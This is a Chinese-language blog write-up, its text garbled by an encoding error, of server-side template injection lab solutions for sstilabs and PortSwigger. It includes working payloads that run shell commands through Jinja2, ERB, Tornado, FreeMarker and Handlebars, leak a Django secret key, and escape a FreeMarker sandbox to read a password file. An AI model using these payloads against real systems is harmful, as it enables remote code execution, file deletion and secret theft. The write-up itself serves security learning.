<h3 id="æ„é€ æ–¹æ³•"><a href="#æ„é€ æ–¹æ³•" class="headerlink" title="æ„é€ æ–¹æ³•"></a>æ„é€ æ–¹æ³•</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> type1=<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(type1,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å®Œæ•´åˆ©ç”¨è¯­æ³•"><a href="#å®Œæ•´åˆ©ç”¨è¯­æ³•" class="headerlink" title="å®Œæ•´åˆ©ç”¨è¯­æ³•"></a>å®Œæ•´åˆ©ç”¨è¯­æ³•</h3><p><code>&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</code></p>
<h3 id="åˆèµ·æ¥"><a href="#åˆèµ·æ¥" class="headerlink" title="åˆèµ·æ¥"></a>åˆèµ·æ¥</h3><h4 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">18</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(<span class="number">9</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> type1=<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(type1,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(<span class="built_in">globals</span>))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><del>æ˜¯è¿™æ ·ï¼Œæˆ‘å†™åˆ°è¿™é‡Œæ‰å‘ç°<code>type flag</code>å°±å¯ä»¥è¯»å–äº†è€Œæˆ‘æ¯æ¬¡éƒ½è´¥åŒ—åœ¨æ€ä¹ˆå¤„ç†<code>type .\\flag</code>çš„ç‚¹å’Œæ </del></p>
<h5 id="level12-13"><a href="#level12-13" class="headerlink" title="level12,13"></a>level12,13</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> et=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|count %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiahuaxian=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(et)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xiahuaxian,xiahuaxian,<span class="built_in">dict</span>(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">type</span>=<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cmd=(<span class="built_in">type</span>,space,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(<span class="built_in">globals</span>))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>ç¾å¥½çš„ä¸€å¤©ä»åšå®Œsstilabså¼€å§‹ã€‚ã€‚ã€‚ğŸ‘ğŸ¥º</p>
<h1 id="portswiggerçš„Server-side-template-injectionæ¨¡å—"><a href="#portswiggerçš„Server-side-template-injectionæ¨¡å—" class="headerlink" title="portswiggerçš„Server-side template injectionæ¨¡å—"></a>portswiggerçš„Server-side template injectionæ¨¡å—</h1><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/server-side-template-injection#constructing-a-server-side-template-injection-attack">Server-side template injection | Web Security Academy</a><br>ã€‚ã€‚ç‰¹åˆ«ç‰¹åˆ«ç»æœ›ã€‚ã€‚ä¸ºä»€ä¹ˆä¸èƒ½å…¨ä¸–ç•Œéƒ½è¯´ä¸­å›½è¯ã€‚ã€‚ã€‚<br>ç¾å¥½çš„ä¸€å¤©å› ä¸ºçœ‹ä¸æ‡‚è‹±æ–‡ç»“æŸã€‚ã€‚ã€‚ğŸ‘ğŸ¥²</p>
<h2 id="Basic-server-side-template-injection"><a href="#Basic-server-side-template-injection" class="headerlink" title="Basic server-side template injection"></a>Basic server-side template injection</h2><p>å·²çŸ¥ï¼šERBæ¨¡æ¿ï¼Œä»»åŠ¡æ˜¯delete the morale.txt file from Carlosâ€™s home directory</p>
<p>åˆ«çš„éƒ½å¯ä»¥æ‰“å¼€ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªä¸èƒ½ï¼Œå‘ç°æ˜¯getå½¢å¼<br><code>?message=Unfortunately%20this%20product%20is%20out%20of%20stock</code><br>æœäº†ERBæ³¨å…¥<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/29440823">æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å®ŒæˆRuby ERBæ¨¡æ¿æ³¨å…¥ - çŸ¥ä¹</a><br>å…ˆ<code>?message=&lt;%= 7 * 7 %&gt;</code>çœ‹çœ‹ï¼Œè¿”å›49â€”â€”â€”â€”ç†Ÿæ‚‰æ„Ÿä¸Šæ¥äº†å•Šuusã€‚ã€‚</p>
<p><code>?message=&lt;%= system(&quot;ls&quot;) %&gt;</code>çœ‹çœ‹<br>è¿”å›<code>morale.txt true</code></p>
<p>psyload<br><code>?message=&lt;%= system(&quot;rm /home/carlos/morale.txt&quot;) %&gt;</code></p>
<p>çœŸè¯¥æ­»å•Šé¢˜ç›®è¯´Carlosæˆ‘æåŠå¤©æ‰å‘ç°è¦å°å†™æ‰æˆåŠŸ</p>
<h2 id="Basic-server-side-template-injection-code-context-å…¨æ˜¯åºŸè¯ä¸é¢˜æ— å…³"><a href="#Basic-server-side-template-injection-code-context-å…¨æ˜¯åºŸè¯ä¸é¢˜æ— å…³" class="headerlink" title="Basic server-side template injection (code context)(å…¨æ˜¯åºŸè¯ä¸é¢˜æ— å…³)"></a><del>Basic server-side template injection (code context)(å…¨æ˜¯åºŸè¯ä¸é¢˜æ— å…³)</del></h2><p>Tornado æ¨¡æ¿</p>
<p>é¢˜ç›®æç¤ºPreferred name<br>å‘ç°è¿™æ˜¯postä¼ å‚<br><code>blog-post-author-display=user.first_name&amp;csrf=bKRQjUQkapqGnDg6fYITYXNuFi6W59Rl</code><br>çœ‹ä¸€çœ¼æºä»£ç </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span>Preferred name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">blog-post-author-display</span> <span class="attr">name</span>=<span class="string">blog-post-author-display</span> <span class="attr">form</span>=<span class="string">blog-post-author-display-form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">user.name</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">user.first_name</span> <span class="attr">selected</span>&gt;</span>First Name<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">user.nickname</span>&gt;</span>Nickname<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ„Ÿè§‰blog-post-author-display å¯ä»¥è¢«åˆ©ç”¨ï¼ˆæˆ‘æ‰¿è®¤å…¶å®æ˜¯çœ‹äº†wpã€‚ã€‚<br>ç„¶åå› ä¸ºæˆ‘ç”µè„‘ä¹‹å‰åäº†bpæ²¡äº†ä¹‹åä¸€ç›´æ²¡è£…å›æ¥ï¼Œæ‰€ä»¥ä¸€ç›´æ˜¯æ˜¯hackbaråšçš„ï¼Œè¿™é¢˜æœ¬æ¥è¦ç”¨bpæˆªå–æµé‡åŒ…ï¼Œä½†æ˜¯æˆ‘ç”¨æ‰‹é€ŸhackbaræŠŠåŠ è½½ä¸­çš„&#x2F;my-account&#x2F;change-blog-post-author-displayé¡µé¢loadä¸‹æ¥äº†ï¼ˆä¸€å¼€å§‹æ²¡çœ‹wpæ—¶æ˜¯çº¯è¿æ°”å¥½åŠ ç½‘æ…¢ï¼‰ï¼Œä½†æ˜¯å¤©æœ‰ä¸æµ‹é£äº‘ï¼Œï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´å¡ä½ï¼Œ<code>&#123;&#123;7*7&#125;&#125;</code>éƒ½ä¸è¡Œï¼Œæˆ‘å¼€äº†wpå¯¹ç€payloadè¯•äº†éƒ½ä¸æˆåŠŸï¼Œå¯èƒ½æœ€åè¿˜æ˜¯è¦bpï¼Œï¼Œæ‰€ä»¥ï¼æ˜å¤©è§ï¼ï¼ï¼ï¼æºœäº†</p>
<p>ç­‰ç­‰æˆ‘åœ¨æºœä¹‹å‰çœ‹äº†ä¸€çœ¼blogå‘ç°æˆ‘ä¸€å¼€å§‹æ‰“çš„<br><code>&#123;&#123;7*7&#125;&#125;</code><br><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64c6765d1ddac507cc0e05c2.jpg"><img src="https://pic.imgdb.cn/item/64c6765d1ddac507cc0e05c2.jpg"></a><br>å› ä¸ºå¿˜è®°åŠ åå¼•å·ä½¿å…¶æˆä¸ºä»£ç å½¢å¼ï¼Œå‘å¸ƒå‡ºæ¥ä¹‹åå˜æˆäº†49<br><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/64c675551ddac507cc0c52f2.jpg"><img src="https://pic.imgdb.cn/item/64c675551ddac507cc0c52f2.jpg"></a><br>ç„¶åæœåˆ°äº†Hexo çš„æ¨¡æ¿å¼•æ“æ˜¯é»˜è®¤ä½¿ç”¨ ejs ç¼–å†™çš„<br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903490930622471">æµ…æ Hexo æ­å»ºåšå®¢çš„åŸç† - æ˜é‡‘</a><br><a target="_blank" rel="noopener" href="https://ejs.bootcss.com/#docs">EJS â€“ åµŒå…¥å¼ JavaScript æ¨¡æ¿å¼•æ“ | EJS ä¸­æ–‡æ–‡æ¡£</a></p>
<hr>
<h2 id="Basic-server-side-template-injection-code-context"><a href="#Basic-server-side-template-injection-code-context" class="headerlink" title="Basic server-side template injection (code context)"></a>Basic server-side template injection (code context)</h2><p>æäº†åŠå¤©åˆçœ‹ä¸æ‡‚è‹±æ–‡åˆä¸ä¼šç”¨bpã€‚ã€‚æœäº†ä¸ªwpè·Ÿç€è¿‡äº†ä¸€é<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Alexhcf/article/details/105890491">Server-side template injection (SSTI)å­¦ä¹ ç¬”è®°</a><br>åŸæ¥åœ¨blog-post-author-displayæ³¨å…¥ä¹‹åæ˜¯åœ¨è¯„è®ºé¡µé¢çœ‹<del>æˆ‘è¯´æ€ªä¸å¾—æ€ä¹ˆæ”¹accouté¡µé¢éƒ½æ˜¾ç¤ºwiener</del><br><a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/template.html">tornado.template â€” Flexible output generation â€” Tornado 6.3.2 documentation</a></p>
<p><code>user.name&#125;&#125;&#123;%25+import+os+%25&#125;&#123;&#123;os.system('rm%20/home/carlos/morale.txt')`

## Server-side template injection using documentation
ç™»å½•ï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆå¯åˆ©ç”¨çš„ï¼Œå›åˆ°ä¸»é¡µé¢æ‰“å¼€ä¸€ä¸ªäº§å“é¡µé¢ï¼ŒæŸ¥çœ‹`Template`
å‘ç°æœ‰`$&#123;product.name&#125;` è¿™ç§ä¸œè¥¿
çœ‹äº†å®˜æ–¹ç»™çš„`@albinowax`è¿™ä¸ªäººçš„
[Server-Side Template Injection | PortSwigger Research](https://portswigger.net/research/server-side-template-injection )
æ„Ÿè§‰å¯èƒ½æ˜¯freemarkerè¾“ä¸ª`$&#123;ex("id")&#125;`previewçœ‹çœ‹
![](https://pic.imgdb.cn/item/64c783601ddac507ccacc309.jpg)
[FAQ - FreeMarker ä¸­æ–‡å®˜æ–¹å‚è€ƒæ‰‹å†Œ](http://freemarker.foofun.cn/app_faq.html )

[Javaå®‰å…¨ä¹‹freemarker æ¨¡æ¿æ³¨å…¥ - nice_0e3 - åšå®¢å›­](https://www.cnblogs.com/nice0e3/p/16217471.html )

`<#assign ex="freemarker.template.utility.Execute"?new()> $&#123; ex ("rm /home/carlos/morale.txt")&#125;`

## Server-side template injection in an unknown language with a documented exploit
çœ‹èµ·æ¥è·Ÿç¬¬ä¸€é¢˜å¾ˆåƒï¼Œ`&#123;&#123;7*7&#125;&#125;`
![](https://pic.imgdb.cn/item/64c78a851ddac507ccba8364.jpg)
é—®äº†chatè€å¸ˆå®ƒè¯´è¿™æ˜¯Handlebarsæ¨¡æ¿
[ä»‹ç» | Handlebars ä¸­æ–‡æ–‡æ¡£ | Handlebars ä¸­æ–‡ç½‘](https://www.handlebarsjs.cn/guide/#%E4%BB%80%E4%B9%88%E6%98%AF-handlebars )

[Handlebarsæ¨¡æ¿æ³¨å…¥åˆ°RCE 0day-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°](https://www.anquanke.com/post/id/176121 )

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#<span class="keyword">with</span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;#<span class="keyword">with</span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> (lookup string.<span class="property">sub</span> <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><br><span class="line">      &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">      &#123;&#123;#<span class="keyword">with</span> string.<span class="property">split</span> <span class="keyword">as</span> |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">push</span> <span class="string">&quot;return JSON.stringify(process.env);&quot;</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;<span class="variable language_">this</span>.<span class="property">pop</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#<span class="keyword">with</span> (string.<span class="property">sub</span>.<span class="property">apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;<span class="variable language_">this</span>&#125;&#125;</span><br><span class="line">          &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">    &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">  &#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br><span class="line">&#123;&#123;/<span class="keyword">with</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

æ€ä¹ˆæ‰€æœ‰æœåˆ°çš„wpå¤§å®¶éƒ½ä¸€ä¸‹å­æ ¹æ®è¿™ä¸ªç‰‡æ®µæ„é€ å‡ºæ¥payloadäº†ï¼Œï¼Œæœ‰æ²¡æœ‰äººæ•™æ•™æˆ‘è¿™æ€ä¹ˆæ”¹ï¼Œï¼Œ
å‹‰å¼ºç†è§£åˆ«äººçš„wpè¿™æ ·ã€‚ã€‚
`require('child_process').exec`
child_process.exec()ï¼šè¡ç”Ÿä¸€ä¸ª shell å¹¶åœ¨è¯¥ shell ä¸­è¿è¡Œå‘½ä»¤ï¼Œå½“å®Œæˆæ—¶åˆ™å°†stdout å’Œ stderr ä¼ ç»™å›è°ƒå‡½æ•°ã€‚
`%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d`

## Server-side template injection with information disclosure via user-supplied objects
ä»»åŠ¡steal and submit the framework's secret key.

è·Ÿç¬¬ä¸‰é¢˜å¾ˆåƒï¼Œè¿›å…¥äº§å“Templateé¡µï¼ŒéšæœºæŒ‘é€‰å¹¸è¿`&#123;&#123;&#125;&#125;` å¡«å…¥`7*7`

è§è¯†å¤ªå°‘ä¸è®¤è¯†ï¼Œé‡äº‹ä¸å†³é—®chatgptï¼Œå¾—çŸ¥è¿™æ˜¯Djangoæ¨¡æ¿
[Django æ–‡æ¡£ | Django æ–‡æ¡£ | Django](https://docs.djangoproject.com/zh-hans/4.2/ )

åœ¨å®˜æ–¹æ–‡æ¡£é‡Œæœç´¢secret key
[é…ç½® | Django æ–‡æ¡£ | Django](https://docs.djangoproject.com/zh-hans/4.2/ref/settings/ )
![](https://pic.imgdb.cn/item/64c7baf21ddac507cc138ed0.jpg)

æŒ‘é€‰ä¸€ä¸ªå¹¸è¿`&#123;&#123;&#125;&#125;`æ”¹æˆ`&#123;%debug%&#125;</code><br><img src="https://pic.imgdb.cn/item/64c7bbc91ddac507cc154fb2.jpg"></p>
<p><code>&#123;&#123;settings.SECRET_KEY&#125;&#125;</code></p>
<h2 id="Server-side-template-injection-in-a-sandboxed-environment"><a href="#Server-side-template-injection-in-a-sandboxed-environment" class="headerlink" title="Server-side template injection in a sandboxed environment"></a>Server-side template injection in a sandboxed environment</h2><p>ä»»åŠ¡break out of the sandbox to read the file my_password.txt from Carlosâ€™s home directory.</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1304/#_3">é€ƒé€¸å®‰å…¨çš„æ¨¡æ¿æ²™ç®±ï¼ˆä¸€ï¼‰â€”â€”FreeMarkerï¼ˆä¸Šï¼‰</a><br>éå¸¸è‡ªä¿¡ï¼Œå˜å˜ä¹±åšğŸ‘ğŸ‘ğŸ‘</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;product.getClass()&#125;</span><br><span class="line"><span class="comment">//  class lab.actions.templateengines.FreeMarkerProduct</span></span><br><span class="line">------</span><br><span class="line">$&#123;product.getClass().getProtectionDomain()&#125;</span><br><span class="line"><span class="comment">// ProtectionDomain (file:/opt/jars/freemarker.jar &lt;no signer certificates&gt;) jdk.internal.loader.ClassLoaders$AppClassLoader@4e7dc304 &lt;no principals&gt; java.security.Permissions@6f27a732 ( (&quot;java.lang.RuntimePermission&quot; &quot;exitVM&quot;) (&quot;java.io.FilePermission&quot; &quot;/opt/jars/freemarker.jar&quot; &quot;read&quot;) )</span></span><br><span class="line">------</span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getClassLoader()&#125;</span><br><span class="line"><span class="comment">// jdk.internal.loader.ClassLoaders$AppClassLoader@4e7dc304</span></span><br><span class="line">------</span><br><span class="line"><span class="comment">// å¤§é”™ç‰¹é”™ï¼ï¼</span></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getClassLoader().getResourceAsStream(<span class="string">&#x27;/home/carlos/my_password.txt&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
<p>æ˜¾ç„¶ï¼Œæœ€åä¸€å¥æ˜¯é”™çš„ï¼Œå»æœäº†ä¸ª<code>getProtectionDomain()</code><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/yu102655/article/details/112347600">getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getSchemeSpecificPart()è¿”å›å†…å®¹è§£æ</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource()&#125;</span><br><span class="line"><span class="comment">// (file:/opt/jars/freemarker.jar &lt;no signer certificates&gt;) </span></span><br><span class="line">------<span class="number">5</span></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation()&#125;</span><br><span class="line"><span class="comment">// file:/opt/jars/freemarker.jar</span></span><br><span class="line">------<span class="number">6</span></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()&#125;</span><br><span class="line"><span class="comment">// file:/opt/jars/freemarker.jar</span></span><br><span class="line">------<span class="number">7</span></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getSchemeSpecificPart()&#125;</span><br><span class="line"><span class="comment">// /opt/jars/freemarker.jar</span></span><br></pre></td></tr></table></figure>
<p>å¥½äº†åˆå¡ä½äº†ï¼Œï¼Œå…¶å®æˆ‘ä¸€å¼€å§‹æ˜¯å°è¯•å»çœ‹javaå®˜æ–¹æ–‡æ¡£çš„ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘çš„é—®é¢˜ï¼ˆè‚¯å®šæ˜¯æˆ‘çš„é—®é¢˜å§ğŸ¥²ğŸ¥²ğŸ¥²ï¼‰ï¼Œä¸æ˜¯æ²¡ä¸­æ–‡ç‰ˆçš„å°±æ˜¯ä¹±ç³Ÿç³Ÿçš„ï¼Œï¼Œï¼Œè¿˜æœ‰æ—¢æ²¡ç¿»è¯‘åˆä¹±ç³Ÿç³Ÿçš„</p>
<p>çœ‹äº†å®˜æ–¹payload<br><code>$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#39;/home/carlos/my_password.txt&#39;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</code><br>ä¹Ÿä¸ç»†è®²ğŸ¥²ğŸ¥²ğŸ¥²ï¼Œæ„Ÿè§‰è¿™ç§é¢˜å¯¹æˆ‘ä¸€ä¸ªjavaäº†è§£ä¸º0çš„æ¥è¯´å¤ªè¿‡äº†ï¼Œæ„Ÿè§‰æˆ‘ç°åœ¨çš„æ°´å¹³å°±æ˜¯çœ‹ä¸ªæ€ï¼ˆä¹ï¼‰è·¯ï¼ˆå­ï¼‰ã€‚</p>
<p>ç„¶åè§£ascii</p>
<h2 id="Server-side-template-injection-with-a-custom-exploit"><a href="#Server-side-template-injection-with-a-custom-exploit" class="headerlink" title="Server-side template injection with a custom exploit"></a>Server-side template injection with a custom exploit</h2><p>å¥½å¤æ‚ï¼Œåˆ©ç”¨æ–‡ä»¶ä¸Šä¼ å¹²å˜›æ¥ç€</p>
<p>éšæœºä¸€ä¸ªæ–‡æ¡£çœ‹çœ‹å®åŠ›</p>
